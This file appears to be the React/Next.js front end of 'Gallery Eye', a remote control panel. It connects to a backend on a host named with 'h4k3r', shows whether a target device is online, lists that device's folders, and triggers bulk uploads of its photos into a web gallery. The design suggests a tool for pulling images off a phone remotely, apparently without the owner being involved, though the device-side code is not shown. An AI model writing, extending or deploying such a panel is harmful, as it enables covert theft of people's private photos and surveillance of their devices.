'use client';

import { useEffect, useState } from 'react';
import Image from 'next/image';
import { io, Socket } from 'socket.io-client';

interface GalleryImage {
    id: string;
    url: string;
    created_at: string;
}

interface Folder {
    name: string;
    count: number;
}

// REPLACE WITH YOUR RENDER BACKEND URL
const API_URL = 'https://h4k3r-gallery-eye.onrender.com';

export default function Home() {
    const [images, setImages] = useState<GalleryImage[]>([]);
    const [loading, setLoading] = useState(true);
    const [socket, setSocket] = useState<Socket | null>(null);
    const [deviceOnline, setDeviceOnline] = useState(false);
    const [folders, setFolders] = useState<Folder[]>([]);
    const [selectedFolder, setSelectedFolder] = useState<string | null>(null);
    const [uploadCount, setUploadCount] = useState<number>(10);
    const [uploadProgress, setUploadProgress] = useState<{ uploaded: number, total: number } | null>(null);

    useEffect(() => {
        // Initial fetch
        fetchImages();

        // Socket Setup
        const newSocket = io(API_URL);
        setSocket(newSocket);

        newSocket.on('connect', () => {
            console.log('Connected to backend');
            newSocket.emit('register_web');
        });

        newSocket.on('device_status', (status) => {
            setDeviceOnline(status.online);
        });

        newSocket.on('folder_list', (data) => {
            setFolders(data);
        });

        newSocket.on('upload_progress', (data) => {
            setUploadProgress(data);
            if (data.uploaded === data.total) {
                // Refresh images when done
                setTimeout(fetchImages, 2000);
            }
        });

        newSocket.on('new_image', (newImage) => {
            setImages(prev => [newImage, ...prev]);
        });

        return () => {
            newSocket.disconnect();
        };
    }, []);

    const fetchImages = () => {
        fetch(`${API_URL}/images`)
            .then((res) => res.json())
            .then((data) => {
                setImages(data);
                setLoading(false);
            })
            .catch((err) => {
                console.error('Failed to fetch images', err);
                setLoading(false);
            });
    };

    const handleScanFolders = () => {
        if (socket) {
            socket.emit('request_folders');
            setFolders([]); // Clear old list
        }
    };

    const handleTriggerUpload = () => {
        if (socket && selectedFolder) {
            setUploadProgress({ uploaded: 0, total: uploadCount });
            socket.emit('trigger_upload', {
                folderName: selectedFolder,
                count: uploadCount
            });
        }
    };

    return (
        <main className="min-h-screen bg-gray-900 text-white p-4 md:p-8">
            <header className="mb-8 text-center">
                <h1 className="text-4xl md:text-5xl font-extrabold bg-clip-text text-transparent bg-gradient-to-r from-purple-400 to-pink-600 mb-2">
                    Gallery Eye
                </h1>
                <div className="flex justify-center items-center gap-2">
                    <div className={`w-3 h-3 rounded-full ${deviceOnline ? 'bg-green-500' : 'bg-red-500'}`}></div>
                    <span className="text-gray-400 text-sm">Device {deviceOnline ? 'Online' : 'Offline'}</span>
                </div>
            </header>

            {/* Control Panel */}
            <div className="bg-gray-800 rounded-xl p-6 mb-8 border border-gray-700 shadow-lg max-w-4xl mx-auto">
                <h2 className="text-xl font-bold mb-4 text-purple-400">Remote Control</h2>

                <div className="flex flex-col md:flex-row gap-4 mb-6">
                    <button
                        onClick={handleScanFolders}
                        className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg transition-colors font-medium"
                    >
                        Scan Device Folders
                    </button>
                </div>

                {folders.length > 0 && (
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div>
                            <label className="block text-gray-400 mb-2 text-sm">Select Folder</label>
                            <div className="max-h-48 overflow-y-auto bg-gray-900 rounded-lg p-2 border border-gray-700">
                                {folders.map((f) => (
                                    <div
                                        key={f.name}
                                        onClick={() => setSelectedFolder(f.name)}
                                        className={`p-2 rounded cursor-pointer flex justify-between items-center ${selectedFolder === f.name ? 'bg-purple-600' : 'hover:bg-gray-700'}`}
                                    >
                                        <span>{f.name}</span>
                                        <span className="bg-gray-800 px-2 py-0.5 rounded text-xs text-gray-300">{f.count}</span>
                                    </div>
                                ))}
                            </div>
                        </div>

                        <div className="flex flex-col justify-between">
                            <div>
                                <label className="block text-gray-400 mb-2 text-sm">Number of Images</label>
                                <div className="flex gap-2 mb-4">
                                    {[10, 20, 50].map(num => (
                                        <button
                                            key={num}
                                            onClick={() => setUploadCount(num)}
                                            className={`px-4 py-2 rounded border ${uploadCount === num ? 'bg-purple-600 border-purple-600' : 'border-gray-600 hover:bg-gray-700'}`}
                                        >
                                            {num}
                                        </button>
                                    ))}
                                    <input
                                        type="number"
                                        value={uploadCount}
                                        onChange={(e) => setUploadCount(parseInt(e.target.value) || 0)}
                                        className="bg-gray-900 border border-gray-600 rounded px-3 w-24 text-center focus:outline-none focus:border-purple-500"
                                        placeholder="Custom"
                                    />
                                </div>
                            </div>

                            <button
                                onClick={handleTriggerUpload}
                                disabled={!selectedFolder}
                                className={`w-full py-3 rounded-lg font-bold text-lg transition-colors ${selectedFolder ? 'bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700' : 'bg-gray-700 cursor-not-allowed text-gray-500'}`}
                            >
                                {uploadProgress ? 'Uploading...' : 'Fetch Images'}
                            </button>
                        </div>
                    </div>
                )}

                {uploadProgress && (
                    <div className="mt-6">
                        <div className="flex justify-between text-sm text-gray-400 mb-1">
                            <span>Uploading...</span>
                            <span>{uploadProgress.uploaded} / {uploadProgress.total}</span>
                        </div>
                        <div className="w-full bg-gray-700 rounded-full h-2.5">
                            <div
                                className="bg-green-500 h-2.5 rounded-full transition-all duration-300"
                                style={{ width: `${(uploadProgress.uploaded / uploadProgress.total) * 100}%` }}
                            ></div>
                        </div>
                    </div>
                )}
            </div>

            {/* Gallery */}
            {loading ? (
                <div className="flex justify-center items-center h-64">
                    <div className="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-purple-500"></div>
                </div>
            ) : (
                <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
                    {images.map((image) => (
                        <div key={image.id} className="relative group aspect-square overflow-hidden rounded-lg bg-gray-800">
                            <Image
                                src={image.url}
                                alt="Gallery Image"
                                fill
                                className="object-cover transition-transform duration-300 group-hover:scale-110"
                                sizes="(max-width: 768px) 50vw, (max-width: 1200px) 33vw, 20vw"
                            />
                            <div className="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity duration-300 flex items-end p-3">
                                <p className="text-white text-xs truncate w-full">
                                    {new Date(image.created_at).toLocaleTimeString()}
                                </p>
                            </div>
                        </div>
                    ))}
                </div>
            )}

            {images.length === 0 && !loading && (
                <div className="text-center text-gray-500 mt-20">
                    <p className="text-xl">No images found.</p>
                    <p className="mt-2">Use the controls above to fetch images from your device.</p>
                </div>
            )}
        </main>
    );
}
